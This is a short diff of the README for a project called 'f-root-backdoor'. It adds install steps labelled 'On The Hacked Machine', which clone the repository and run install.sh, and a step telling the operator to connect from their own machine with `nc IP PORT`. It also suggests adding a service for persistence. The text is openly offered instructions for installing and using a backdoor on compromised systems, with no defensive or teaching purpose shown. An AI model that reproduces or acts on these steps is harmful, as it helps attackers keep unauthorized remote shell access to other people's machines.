@@ -46,12 +46,15 @@ If you want to simplify things run the file install.sh (Modify the file Server.p
 
 if you don't just change things in the file and it's ready to run, if you want to add an extra persistence you can add a service that will run the file
 
-## Install
+## Install 
+### On The Hacked Machine
 ```
 git clone https://github.com/Detrew/f-root-backdoor
 cd f-root-backdoor
 chmod +x install.sh
 bash install.sh
 ```
+### On Your Machine Connect Using nc
+`nc IP PORT`
 
 ### problems or doubts my discord is Detrew#0600
